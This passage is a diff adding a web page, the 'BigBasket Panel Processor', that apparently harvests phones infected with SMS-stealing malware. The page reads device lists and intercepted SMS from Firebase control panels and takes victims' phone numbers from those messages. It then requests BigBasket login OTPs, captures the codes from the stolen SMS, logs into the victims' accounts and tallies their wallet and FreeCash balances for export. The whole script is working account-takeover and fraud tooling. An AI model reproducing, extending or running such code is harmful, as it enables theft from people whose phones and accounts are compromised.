@@ -1,0 +1,1270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BigBasket Panel Processor</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0f0f1a;
+            color: #e0e0e0;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        h1 {
+            color: #6c63ff;
+            text-align: center;
+            margin-bottom: 8px;
+            font-weight: 300;
+            letter-spacing: 1px;
+        }
+        .subtitle {
+            text-align: center;
+            color: #888;
+            margin-bottom: 25px;
+            font-size: 14px;
+        }
+        .card {
+            background: #1a1a2e;
+            border-radius: 16px;
+            padding: 24px;
+            margin-bottom: 20px;
+            border: 1px solid #2a2a4a;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+        }
+        .card-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #a8a8ff;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .card-title .badge {
+            background: #2a2a5a;
+            padding: 2px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            color: #aaa;
+        }
+        textarea {
+            width: 100%;
+            min-height: 120px;
+            background: #0d0d1a;
+            border: 1px solid #2a2a4a;
+            border-radius: 10px;
+            color: #e0e0e0;
+            padding: 14px;
+            font-size: 14px;
+            font-family: 'Consolas', monospace;
+            resize: vertical;
+            transition: border-color 0.3s;
+        }
+        textarea:focus {
+            outline: none;
+            border-color: #6c63ff;
+        }
+        .btn {
+            padding: 12px 32px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .btn-primary {
+            background: #6c63ff;
+            color: #fff;
+        }
+        .btn-primary:hover {
+            background: #5a52e0;
+            transform: scale(1.02);
+        }
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .btn-danger {
+            background: #e74c6f;
+            color: #fff;
+        }
+        .btn-danger:hover {
+            background: #c0395b;
+        }
+        .btn-success {
+            background: #2ecc71;
+            color: #fff;
+        }
+        .btn-success:hover {
+            background: #27ae60;
+        }
+        .btn-outline {
+            background: transparent;
+            border: 1px solid #4a4a6a;
+            color: #ccc;
+        }
+        .btn-outline:hover {
+            background: #2a2a4a;
+        }
+        .flex-row {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            align-items: center;
+            margin-top: 14px;
+        }
+        .flex-between {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        .status-bar {
+            background: #0d0d1a;
+            border-radius: 10px;
+            padding: 14px 18px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 20px;
+            align-items: center;
+            border: 1px solid #2a2a4a;
+        }
+        .stat {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 14px;
+        }
+        .stat .num {
+            font-weight: 700;
+            font-size: 18px;
+            color: #fff;
+        }
+        .stat .num.green { color: #2ecc71; }
+        .stat .num.yellow { color: #f1c40f; }
+        .stat .num.red { color: #e74c6f; }
+        .stat .num.purple { color: #9b59b6; }
+        .stat .num.orange { color: #e67e22; }
+        .log-container {
+            max-height: 400px;
+            overflow-y: auto;
+            background: #0a0a14;
+            border-radius: 10px;
+            padding: 12px 16px;
+            font-family: 'Consolas', monospace;
+            font-size: 13px;
+            line-height: 1.6;
+            border: 1px solid #1a1a3a;
+        }
+        .log-container::-webkit-scrollbar {
+            width: 6px;
+        }
+        .log-container::-webkit-scrollbar-track {
+            background: #0a0a14;
+        }
+        .log-container::-webkit-scrollbar-thumb {
+            background: #3a3a6a;
+            border-radius: 10px;
+        }
+        .log-entry {
+            padding: 2px 0;
+            border-bottom: 1px solid #111122;
+        }
+        .log-entry .time {
+            color: #555;
+            margin-right: 10px;
+        }
+        .log-entry .info { color: #5bc0de; }
+        .log-entry .success { color: #2ecc71; }
+        .log-entry .error { color: #e74c6f; }
+        .log-entry .warning { color: #f1c40f; }
+        .log-entry .cash { color: #f39c12; font-weight: 600; }
+        .log-entry .panel { color: #9b59b6; }
+
+        .result-table-wrap {
+            overflow-x: auto;
+            margin-top: 12px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 13px;
+        }
+        th {
+            background: #1a1a3a;
+            color: #a8a8ff;
+            padding: 10px 12px;
+            text-align: left;
+            font-weight: 600;
+            position: sticky;
+            top: 0;
+        }
+        td {
+            padding: 8px 12px;
+            border-bottom: 1px solid #1a1a2e;
+        }
+        tr:hover td {
+            background: #15152a;
+        }
+        .cash-badge {
+            background: #f39c12;
+            color: #000;
+            padding: 2px 10px;
+            border-radius: 20px;
+            font-weight: 700;
+            font-size: 12px;
+        }
+        .wallet-badge {
+            background: #2ecc71;
+            color: #000;
+            padding: 2px 10px;
+            border-radius: 20px;
+            font-weight: 700;
+            font-size: 12px;
+        }
+        .empty-state {
+            color: #555;
+            text-align: center;
+            padding: 30px;
+        }
+        .progress-wrap {
+            width: 100%;
+            height: 4px;
+            background: #1a1a3a;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-top: 8px;
+        }
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #6c63ff, #a855f7);
+            width: 0%;
+            transition: width 0.3s;
+            border-radius: 4px;
+        }
+        .panel-list {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-top: 10px;
+        }
+        .panel-tag {
+            background: #1a1a3a;
+            padding: 4px 14px;
+            border-radius: 20px;
+            font-size: 12px;
+            color: #aaa;
+            border: 1px solid #2a2a4a;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .panel-tag .idx {
+            color: #6c63ff;
+            font-weight: 700;
+        }
+        .panel-tag .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+        .panel-tag .status-dot.pending { background: #555; }
+        .panel-tag .status-dot.running { background: #f1c40f; animation: pulse 1s infinite; }
+        .panel-tag .status-dot.done { background: #2ecc71; }
+        .panel-tag .status-dot.error { background: #e74c6f; }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        .hidden { display: none; }
+        .mt-8 { margin-top: 8px; }
+        .mt-16 { margin-top: 16px; }
+        .gap-8 { gap: 8px; }
+
+        /* Mobile */
+        @media (max-width: 600px) {
+            .card { padding: 16px; }
+            .flex-between { flex-direction: column; align-items: stretch; }
+            .stat { font-size: 12px; }
+            .stat .num { font-size: 15px; }
+            .btn { padding: 10px 20px; font-size: 14px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>🛒 BigBasket Panel Processor</h1>
+    <p class="subtitle">Paste panel links → Auto-fetch numbers → Check wallet & freecash</p>
+
+    <!-- Input Panel -->
+    <div class="card">
+        <div class="card-title">
+            📋 Panel Links
+            <span class="badge" id="panelCount">0 panels</span>
+        </div>
+        <textarea id="panelInput" placeholder="Paste your panel links here (one per line)&#10;Examples:&#10;https://your-project.firebaseio.com/&#10;https://profexpanel.netlify.app/?s=encoded_data&#10;your-project.firebaseio.com"></textarea>
+        <div class="flex-row">
+            <button class="btn btn-primary" id="startBtn">▶ Start Processing</button>
+            <button class="btn btn-outline" id="clearBtn">Clear</button>
+            <button class="btn btn-outline" id="clearResultsBtn">Clear Results</button>
+            <button class="btn btn-success" id="exportBtn">📥 Export CSV</button>
+        </div>
+        <div class="panel-list" id="panelList"></div>
+    </div>
+
+    <!-- Status -->
+    <div class="card">
+        <div class="flex-between">
+            <div class="card-title" style="margin-bottom:0;">
+                📊 Status
+                <span class="badge" id="statusBadge">Idle</span>
+            </div>
+            <span id="currentPanelLabel" style="color:#888;font-size:14px;"></span>
+        </div>
+        <div class="status-bar" id="statusBar">
+            <div class="stat">📱 Total: <span class="num" id="totalDevices">0</span></div>
+            <div class="stat">✅ Done: <span class="num green" id="doneDevices">0</span></div>
+            <div class="stat">💰 Cash: <span class="num orange" id="cashDevices">0</span></div>
+            <div class="stat">💳 Wallet: ₹<span class="num purple" id="totalWallet">0</span></div>
+            <div class="stat">🎯 FreeCash: ₹<span class="num purple" id="totalFreecash">0</span></div>
+            <div class="stat">⚠️ Errors: <span class="num red" id="errorDevices">0</span></div>
+        </div>
+        <div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
+    </div>
+
+    <!-- Log -->
+    <div class="card">
+        <div class="card-title">
+            📜 Live Log
+            <span class="badge" id="logCount">0 entries</span>
+        </div>
+        <div class="log-container" id="logContainer">
+            <div class="empty-state">Waiting for actions...</div>
+        </div>
+    </div>
+
+    <!-- Results Table -->
+    <div class="card">
+        <div class="card-title">
+            💰 Cash Results
+            <span class="badge" id="resultCount">0</span>
+        </div>
+        <div class="result-table-wrap">
+            <table>
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>Panel</th>
+                        <th>Device ID</th>
+                        <th>Phone</th>
+                        <th>Wallet</th>
+                        <th>FreeCash</th>
+                        <th>Status</th>
+                    </tr>
+                </thead>
+                <tbody id="resultBody">
+                    <tr><td colspan="7" class="empty-state">No results yet</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+</div>
+
+<script>
+// ============================================================
+// STATE
+// ============================================================
+const state = {
+    panels: [],           // { id, raw, firebaseUrl, status, devices: [], currentIndex }
+    results: [],          // { panel, deviceId, phone, wallet, freecash, status, message }
+    totalDevices: 0,
+    processedDevices: 0,
+    running: false,
+    abort: false,
+};
+
+// ============================================================
+// DOM REFS
+// ============================================================
+const $ = (id) => document.getElementById(id);
+const panelInput = $('panelInput');
+const startBtn = $('startBtn');
+const clearBtn = $('clearBtn');
+const clearResultsBtn = $('clearResultsBtn');
+const exportBtn = $('exportBtn');
+const panelList = $('panelList');
+const panelCount = $('panelCount');
+const statusBadge = $('statusBadge');
+const currentPanelLabel = $('currentPanelLabel');
+const totalDevices = $('totalDevices');
+const doneDevices = $('doneDevices');
+const cashDevices = $('cashDevices');
+const totalWallet = $('totalWallet');
+const totalFreecash = $('totalFreecash');
+const errorDevices = $('errorDevices');
+const progressBar = $('progressBar');
+const logContainer = $('logContainer');
+const logCount = $('logCount');
+const resultBody = $('resultBody');
+const resultCount = $('resultCount');
+
+// ============================================================
+// LOGGING
+// ============================================================
+function addLog(message, type = 'info') {
+    const time = new Date().toLocaleTimeString();
+    const entry = document.createElement('div');
+    entry.className = 'log-entry';
+    entry.innerHTML = `<span class="time">[${time}]</span><span class="${type}">${message}</span>`;
+    // Remove empty state
+    const empty = logContainer.querySelector('.empty-state');
+    if (empty) empty.remove();
+    logContainer.appendChild(entry);
+    logContainer.scrollTop = logContainer.scrollHeight;
+    logCount.textContent = logContainer.children.length;
+}
+
+function clearLog() {
+    logContainer.innerHTML = `<div class="empty-state">Waiting for actions...</div>`;
+    logCount.textContent = '0';
+}
+
+// ============================================================
+// PANEL PARSING
+// ============================================================
+function parsePanelLink(link) {
+    if (!link) return null;
+    link = link.trim();
+    // Already a Firebase URL
+    if (link.startsWith('https://') && (link.includes('firebaseio.com') || link.includes('firebasedatabase.app'))) {
+        if (!link.endsWith('/')) link += '/';
+        return link;
+    }
+    // Add https
+    if (link.includes('firebaseio.com') || link.includes('firebasedatabase.app')) {
+        if (!link.startsWith('http')) link = 'https://' + link;
+        if (!link.endsWith('/')) link += '/';
+        return link;
+    }
+    // Try decoding from ?s= parameter
+    try {
+        const url = new URL(link);
+        const s = url.searchParams.get('s');
+        if (s) {
+            let decoded = atob(s);
+            if (decoded.includes('|||')) {
+                decoded = decoded.split('|||')[0];
+            }
+            if (!decoded.startsWith('http')) decoded = 'https://' + decoded;
+            if (!decoded.endsWith('/')) decoded += '/';
+            return decoded;
+        }
+    } catch (e) {}
+    return null;
+}
+
+function parsePanels(text) {
+    const lines = text.split('\n').map(s => s.trim()).filter(s => s.length > 0);
+    const results = [];
+    for (const line of lines) {
+        const url = parsePanelLink(line);
+        if (url) {
+            results.push({ raw: line, firebaseUrl: url });
+        }
+    }
+    return results;
+}
+
+// ============================================================
+// FIREBASE FETCH
+// ============================================================
+async function fetchClients(firebaseUrl) {
+    const url = firebaseUrl + 'clients.json';
+    const resp = await fetch(url);
+    if (!resp.ok) return [];
+    const data = await resp.json();
+    if (!data || typeof data !== 'object') return [];
+    const clients = [];
+    for (const [id, info] of Object.entries(data)) {
+        if (typeof info !== 'object' || !info) continue;
+        // Only online devices
+        if (!info.status) continue;
+        clients.push({
+            id: id,
+            name: info.modelName || info.model || info.deviceName || id,
+            battery: info.battery || '—',
+            phone: info.mobNo || (info.sims && Array.isArray(info.sims) ? info.sims[0]?.phoneNumber : null) || null,
+            provider: info.service_provider || '',
+            android: info.androidV || info.androidVersion || '—',
+            lastSeen: info.lastSeen || info.lastOnline || info.timestamp || '',
+        });
+    }
+    return clients;
+}
+
+async function fetchPhoneFromMessages(firebaseUrl, clientId) {
+    const url = `${firebaseUrl}messages/${clientId}.json?orderBy="$key"&limitToLast=10`;
+    const resp = await fetch(url);
+    if (!resp.ok) return null;
+    const data = await resp.json();
+    if (!data || typeof data !== 'object') return null;
+    
+    const patterns = [
+        /\b(?:\+91|91|0)?([6-9]\d{9})\b/,
+        /\b(?:phone|mobile|number)[\s:]*([6-9]\d{9})\b/i,
+        /[^0-9]([6-9]\d{9})[^0-9]/,
+    ];
+    
+    for (const [msgId, msg] of Object.entries(data)) {
+        if (typeof msg !== 'object') continue;
+        const text = String(msg.body || msg.message || msg.text || '');
+        for (const pat of patterns) {
+            const match = text.match(pat);
+            if (match) {
+                let num = match[1] || match[0];
+                num = num.replace(/[^0-9]/g, '');
+                if (num.length === 12 && num.startsWith('91')) num = num.slice(2);
+                if (num.length === 10 && /^[6-9]/.test(num)) return num;
+            }
+        }
+    }
+    return null;
+}
+
+async function fetchOtpFromFirebase(firebaseUrl, clientId, timeout = 25) {
+    const startTime = Date.now();
+    const triggerTime = Date.now() - 25000;
+    const patterns = [
+        /(?<!\d)(\d{6})(?!\d)/,
+        /(?:login code|otp|verification code)[:\s]*(\d{6})/i,
+        /(\d{6})\s+is your OTP/i,
+        /Your OTP is (\d{6})/i,
+        /Use OTP (\d{6})/i,
+        /Bigbasket login code[:\s]*(\d{6})/i,
+    ];
+    
+    while (Date.now() - startTime < timeout * 1000) {
+        try {
+            const url = `${firebaseUrl}messages/${clientId}.json`;
+            const resp = await fetch(url);
+            if (!resp.ok) { await sleep(500); continue; }
+            const data = await resp.json();
+            if (!data || typeof data !== 'object') { await sleep(500); continue; }
+            
+            for (const [msgId, msg] of Object.entries(data)) {
+                if (typeof msg !== 'object') continue;
+                // Check timestamp
+                try {
+                    const ts = parseInt(msgId);
+                    if (ts < triggerTime) continue;
+                } catch (e) {}
+                
+                const text = String(msg.body || msg.message || msg.text || '');
+                const lower = text.toLowerCase();
+                if (!lower.includes('bigbasket') && !lower.includes('login code') && !lower.includes('otp') && !lower.includes('verification')) {
+                    continue;
+                }
+                for (const pat of patterns) {
+                    const match = text.match(pat);
+                    if (match) {
+                        let otp = match[1] || match[0];
+                        otp = otp.replace(/\D/g, '');
+                        if (otp.length === 6 && /^\d{6}$/.test(otp)) return otp;
+                    }
+                }
+            }
+            await sleep(500);
+        } catch (e) {
+            await sleep(500);
+        }
+    }
+    return null;
+}
+
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+// ============================================================
+// BIGBASKET CLIENT
+// ============================================================
+class BigBasketClient {
+    constructor() {
+        this.deviceId = null;
+        this.visitorId = null;
+        this.mId = null;
+        this.bbToken = null;
+        this.refId = null;
+        this.csrfToken = null;
+        this.cookies = {};
+        this.headers = {
+            'accept': 'application/json, text/plain, */*',
+            'accept-encoding': 'gzip, deflate, br',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'no-cache',
+            'pragma': 'no-cache',
+            'sec-ch-ua': '"Google Chrome";v="120", "Not:A-Brand";v="8", "Chromium";v="120"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'BB Android/v8.35.0/os 15',
+            'x-channel': 'BB-Android',
+            'x-entry-context': 'bb-b2c',
+            'x-tcp-platform': 'native',
+            'x-tcp-device-version': 'android_8.35.0_25113510',
+            'common-client-static-version': '104',
+            'x-device-model': 'Samsung SM-A536E',
+            'x-is-debug': 'false',
+            'x-pharma': 'true',
+            'x-integrated-fc-door-visible': 'true',
+            'x-bucket-id': '50',
+        };
+    }
+
+    _setCookie(name, value) {
+        this.cookies[name] = value;
+    }
+
+    _getCookie(name) {
+        return this.cookies[name] || null;
+    }
+
+    _request(method, url, options = {}) {
+        const opts = {
+            method: method,
+            headers: { ...this.headers, ...(options.headers || {}) },
+            ...options,
+        };
+        // Add cookies
+        if (Object.keys(this.cookies).length) {
+            opts.headers['Cookie'] = Object.entries(this.cookies)
+                .map(([k, v]) => `${k}=${v}`)
+                .join('; ');
+        }
+        if (options.body && typeof options.body === 'object' && !(options.body instanceof FormData)) {
+            opts.body = JSON.stringify(options.body);
+            opts.headers['Content-Type'] = 'application/json';
+        }
+        return fetch(url, opts);
+    }
+
+    async _fetchJson(method, url, options = {}) {
+        let resp = await this._request(method, url, options);
+        // Handle rate limit
+        for (let attempt = 0; attempt < 3 && resp.status === 429; attempt++) {
+            await sleep(2000 * (attempt + 1));
+            resp = await this._request(method, url, options);
+        }
+        // Update cookies from response
+        const setCookie = resp.headers.get('set-cookie');
+        if (setCookie) {
+            const parts = setCookie.split(';');
+            for (const part of parts) {
+                const [name, value] = part.trim().split('=');
+                if (name && value !== undefined) {
+                    this._setCookie(name, value);
+                }
+            }
+        }
+        // Check for csrf token in cookies
+        if (this.cookies['csurftoken']) {
+            this.csrfToken = this.cookies['csurftoken'];
+        }
+        return resp;
+    }
+
+    generateDeviceId() {
+        return Array.from({ length: 16 }, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
+    }
+
+    async registerDevice() {
+        this.deviceId = this.generateDeviceId();
+        const payload = {
+            imei: '02:00:00:00:00:00',
+            device_id: this.deviceId,
+            city_id: '1',
+            properties: JSON.stringify({
+                platform: 'java',
+                os_name: 'android',
+                os_version: '15',
+                app_version: '8.35.0',
+                device_make: 'Samsung',
+                device_model: 'SM-A536E',
+                screen_resolution: '900X1600',
+                screen_dpi: 240
+            })
+        };
+        try {
+            const resp = await this._fetchJson('POST', 'https://www.bigbasket.com/mapi/v4.2.0/register/device/', {
+                body: payload
+            });
+            if (resp.ok) {
+                const data = await resp.json();
+                if (data?.response?.visitor_id) {
+                    this.visitorId = data.response.visitor_id;
+                }
+                return true;
+            }
+            return false;
+        } catch (e) {
+            return false;
+        }
+    }
+
+    async loadUiData() {
+        const endpoints = [
+            'https://www.bigbasket.com/ui-svc/v2/header/?send_door_info=true&app_launch=true',
+            'https://www.bigbasket.com/ui-svc/v1/app-data?os_name=android&app_version=8.35.0',
+            'https://www.bigbasket.com/ui-svc/v1/door-data?lob_required=true',
+        ];
+        for (const url of endpoints) {
+            try {
+                await this._fetchJson('GET', url);
+                await sleep(200);
+            } catch (e) {}
+        }
+        return true;
+    }
+
+    async updateDeviceInfo() {
+        try {
+            await this._fetchJson('POST', 'https://www.bigbasket.com/mapi/v4.2.0/update/device/info/', {
+                body: { ad_id: '3e0d3f64-3657-40af-9095-c0f4fc692d8e' }
+            });
+            return true;
+        } catch { return true; }
+    }
+
+    async requestOtp(mobile) {
+        try {
+            const resp = await this._fetchJson('POST', 'https://www.bigbasket.com/member-tdl/v3/member/otp/', {
+                body: { identifier: mobile, referrer: 'unified_login' }
+            });
+            if (resp.ok) {
+                const data = await resp.json();
+                if (data?.refId) {
+                    this.refId = data.refId;
+                    return true;
+                }
+            }
+            return false;
+        } catch (e) {
+            return false;
+        }
+    }
+
+    async verifyOtp(mobile, otp) {
+        try {
+            const resp = await this._fetchJson('POST', 'https://www.bigbasket.com/member-tdl/v3/member/unified-login/', {
+                body: { mobile_no: mobile, mobile_no_otp: otp, refId: this.refId }
+            });
+            if (resp.ok) {
+                const data = await resp.json();
+                if (data?.bb_token) {
+                    this.bbToken = data.bb_token;
+                    this._setCookie('BBAUTHTOKEN', this.bbToken);
+                }
+                if (data?.visitor_id) this.visitorId = data.visitor_id;
+                if (data?.m_id) this.mId = data.m_id;
+                this.csrfToken = this._getCookie('csurftoken');
+                return true;
+            }
+            return false;
+        } catch (e) {
+            return false;
+        }
+    }
+
+    async getWallet() {
+        if (!this.bbToken) return null;
+        try {
+            // Refresh
+            await this._fetchJson('GET', 'https://www.bigbasket.com/ui-svc/v2/header/?send_door_info=true');
+            this.csrfToken = this._getCookie('csurftoken');
+            
+            const headers = {
+                'x-entry-context-id': '100',
+                'x-integrated-fc-door-visible': 'true',
+                'x-entry-context': 'bb-b2c',
+                'x-tracker': crypto.randomUUID(),
+                'x-pharma': 'true',
+            };
+            if (this.csrfToken) headers['x-csurftoken'] = this.csrfToken;
+            
+            this._setCookie('_bb_source', 'app');
+            this._setCookie('_bb_vid', this.visitorId || '');
+            this._setCookie('_bb_mid', this.mId || '');
+            
+            const resp = await this._fetchJson('GET', 'https://www.bigbasket.com/wallet/v1/details', {
+                headers: headers
+            });
+            if (resp.ok) {
+                return await resp.json();
+            }
+            return null;
+        } catch (e) {
+            return null;
+        }
+    }
+
+    async getFreeCash() {
+        if (!this.bbToken) return null;
+        try {
+            await this._fetchJson('GET', 'https://www.bigbasket.com/ui-svc/v2/header/?send_door_info=true');
+            this.csrfToken = this._getCookie('csurftoken');
+            
+            const headers = {
+                'content-type': 'application/json',
+                'x-retry': '0',
+                'x-tcp-device-version': 'android_8.38.0_25115710',
+                'common-client-static-version': '105',
+                'x-bucket-id': '36',
+                'x-channel': 'BB-Android',
+                'x-tracker': crypto.randomUUID(),
+                'x-entry-context': 'bb-b2c',
+                'x-entry-context-id': '100',
+            };
+            if (this.csrfToken) headers['x-csurftoken'] = this.csrfToken;
+            
+            const payload = {
+                freecash_v2_enabled: true,
+                sa_city_ids: [18],
+                sa_ids: [28425],
+                context: 'homepage',
+                page_type: null,
+                channel: 'BB-Android'
+            };
+            const resp = await this._fetchJson('POST', 'https://www.bigbasket.com/ui-svc/v1/free-cash/', {
+                headers: headers,
+                body: payload
+            });
+            if (resp.ok) {
+                return await resp.json();
+            }
+            return null;
+        } catch (e) {
+            return null;
+        }
+    }
+}
+
+// ============================================================
+// DEVICE PROCESSOR
+// ============================================================
+async function processDevice(phone, clientId, firebaseUrl, panelIdx, panelTotal) {
+    const prefix = `[P${panelIdx}/${panelTotal}] ${phone}`;
+    addLog(`${prefix} Starting...`, 'info');
+    
+    const result = {
+        panel: firebaseUrl,
+        deviceId: clientId,
+        phone: phone,
+        wallet: 0,
+        freecash: 0,
+        status: 'error',
+        message: '',
+    };
+    
+    try {
+        const client = new BigBasketClient();
+        
+        addLog(`${prefix} Registering device...`, 'info');
+        if (!await client.registerDevice()) {
+            result.status = 'error';
+            result.message = 'Registration failed';
+            addLog(`${prefix} ❌ Registration failed`, 'error');
+            return result;
+        }
+        
+        addLog(`${prefix} Loading UI...`, 'info');
+        await client.loadUiData();
+        await client.updateDeviceInfo();
+        
+        addLog(`${prefix} Requesting OTP...`, 'info');
+        if (!await client.requestOtp(phone)) {
+            result.status = 'error';
+            result.message = 'OTP request failed';
+            addLog(`${prefix} ❌ OTP request failed`, 'error');
+            return result;
+        }
+        
+        addLog(`${prefix} Waiting for OTP from Firebase...`, 'info');
+        const otp = await fetchOtpFromFirebase(firebaseUrl, clientId, 25);
+        
+        if (!otp) {
+            result.status = 'error';
+            result.message = 'OTP not received';
+            addLog(`${prefix} ❌ OTP not received`, 'error');
+            return result;
+        }
+        
+        addLog(`${prefix} ✅ OTP received: ${otp}`, 'success');
+        
+        addLog(`${prefix} Verifying OTP...`, 'info');
+        if (!await client.verifyOtp(phone, otp)) {
+            result.status = 'error';
+            result.message = 'OTP verification failed';
+            addLog(`${prefix} ❌ OTP verification failed`, 'error');
+            return result;
+        }
+        
+        addLog(`${prefix} ✅ Login successful!`, 'success');
+        
+        addLog(`${prefix} Fetching wallet...`, 'info');
+        const wallet = await client.getWallet();
+        const balance = wallet?.current_wallet_balance || 0;
+        result.wallet = Math.round(balance);
+        
+        addLog(`${prefix} Fetching FreeCash...`, 'info');
+        const freecashData = await client.getFreeCash();
+        const freecash = freecashData?.total_freecash_amount || 0;
+        result.freecash = Math.round(freecash);
+        
+        if (balance > 0 && freecash > 0) {
+            result.status = 'cash';
+            result.message = `Wallet: ₹${balance}, FreeCash: ₹${freecash}`;
+            addLog(`${prefix} 💰 Wallet: ₹${balance} | FreeCash: ₹${freecash}`, 'cash');
+        } else if (balance > 0) {
+            result.status = 'wallet';
+            result.message = `Wallet: ₹${balance}`;
+            addLog(`${prefix} 💳 Wallet: ₹${balance}`, 'success');
+        } else if (freecash > 0) {
+            result.status = 'cash';
+            result.message = `FreeCash: ₹${freecash}`;
+            addLog(`${prefix} 🎯 FreeCash: ₹${freecash}`, 'cash');
+        } else {
+            result.status = 'success';
+            result.message = 'No cash found';
+            addLog(`${prefix} No cash found (Wallet: ₹0, FreeCash: ₹0)`, 'info');
+        }
+        
+        return result;
+        
+    } catch (e) {
+        result.status = 'error';
+        result.message = e.message || 'Unknown error';
+        addLog(`${prefix} ❌ Error: ${e.message}`, 'error');
+        return result;
+    }
+}
+
+// ============================================================
+// MAIN PROCESSOR
+// ============================================================
+async function runProcessor() {
+    if (state.running) return;
+    
+    // Parse panels
+    const text = panelInput.value;
+    const parsed = parsePanels(text);
+    if (parsed.length === 0) {
+        addLog('❌ No valid panels found. Please check your input.', 'error');
+        return;
+    }
+    
+    state.running = true;
+    state.abort = false;
+    state.results = [];
+    state.panels = parsed.map((p, i) => ({
+        id: i,
+        ...p,
+        status: 'pending',
+        devices: [],
+        currentIndex: 0,
+    }));
+    state.totalDevices = 0;
+    state.processedDevices = 0;
+    
+    startBtn.disabled = true;
+    startBtn.textContent = '⏳ Running...';
+    statusBadge.textContent = 'Running';
+    statusBadge.style.color = '#f1c40f';
+    clearLog();
+    updatePanelTags();
+    updateStats();
+    updateResults();
+    
+    addLog(`📦 Found ${parsed.length} panel(s)`, 'panel');
+    
+    try {
+        for (let pi = 0; pi < state.panels.length; pi++) {
+            if (state.abort) break;
+            
+            const panel = state.panels[pi];
+            panel.status = 'running';
+            updatePanelTags();
+            currentPanelLabel.textContent = `Panel ${pi+1}/${state.panels.length}`;
+            
+            addLog(`📡 Panel ${pi+1}: Fetching devices from ${panel.firebaseUrl}`, 'panel');
+            
+            // Fetch clients
+            let clients = [];
+            try {
+                clients = await fetchClients(panel.firebaseUrl);
+            } catch (e) {
+                addLog(`❌ Panel ${pi+1}: Failed to fetch clients: ${e.message}`, 'error');
+                panel.status = 'error';
+                updatePanelTags();
+                continue;
+            }
+            
+            if (clients.length === 0) {
+                addLog(`⚠️ Panel ${pi+1}: No online devices found`, 'warning');
+                panel.status = 'done';
+                updatePanelTags();
+                continue;
+            }
+            
+            addLog(`📱 Panel ${pi+1}: Found ${clients.length} online device(s)`, 'info');
+            
+            // For each client, try to get phone number
+            const devicesWithPhone = [];
+            for (const client of clients) {
+                let phone = client.phone;
+                if (!phone || phone === '—') {
+                    phone = await fetchPhoneFromMessages(panel.firebaseUrl, client.id);
+                }
+                if (phone) {
+                    devicesWithPhone.push({ ...client, phone });
+                }
+            }
+            
+            if (devicesWithPhone.length === 0) {
+                addLog(`⚠️ Panel ${pi+1}: No phone numbers found`, 'warning');
+                panel.status = 'done';
+                updatePanelTags();
+                continue;
+            }
+            
+            panel.devices = devicesWithPhone;
+            state.totalDevices += devicesWithPhone.length;
+            updateStats();
+            
+            addLog(`📱 Panel ${pi+1}: Processing ${devicesWithPhone.length} device(s)`, 'info');
+            
+            // Process each device
+            for (let di = 0; di < devicesWithPhone.length; di++) {
+                if (state.abort) break;
+                const device = devicesWithPhone[di];
+                panel.currentIndex = di + 1;
+                
+                const result = await processDevice(
+                    device.phone,
+                    device.id,
+                    panel.firebaseUrl,
+                    pi + 1,
+                    state.panels.length
+                );
+                
+                state.results.push(result);
+                state.processedDevices++;
+                updateStats();
+                updateResults();
+                
+                // Update progress
+                const pct = (state.processedDevices / state.totalDevices) * 100;
+                progressBar.style.width = Math.min(pct, 100) + '%';
+            }
+            
+            panel.status = 'done';
+            updatePanelTags();
+            addLog(`✅ Panel ${pi+1}: Complete (${devicesWithPhone.length} devices processed)`, 'success');
+        }
+        
+        if (state.abort) {
+            addLog('⏹️ Processing stopped by user', 'warning');
+        } else {
+            addLog('✅ All panels processed!', 'success');
+        }
+        
+    } catch (e) {
+        addLog(`❌ Fatal error: ${e.message}`, 'error');
+    }
+    
+    state.running = false;
+    startBtn.disabled = false;
+    startBtn.textContent = '▶ Start Processing';
+    statusBadge.textContent = 'Idle';
+    statusBadge.style.color = '#888';
+    currentPanelLabel.textContent = '';
+    updatePanelTags();
+}
+
+// ============================================================
+// UI UPDATES
+// ============================================================
+function updatePanelTags() {
+    const container = panelList;
+    container.innerHTML = '';
+    state.panels.forEach((p, i) => {
+        const tag = document.createElement('span');
+        tag.className = 'panel-tag';
+        const dot = document.createElement('span');
+        dot.className = `status-dot ${p.status}`;
+        tag.appendChild(dot);
+        const label = document.createTextNode(`#${i+1}: ${p.firebaseUrl.substring(0, 30)}...`);
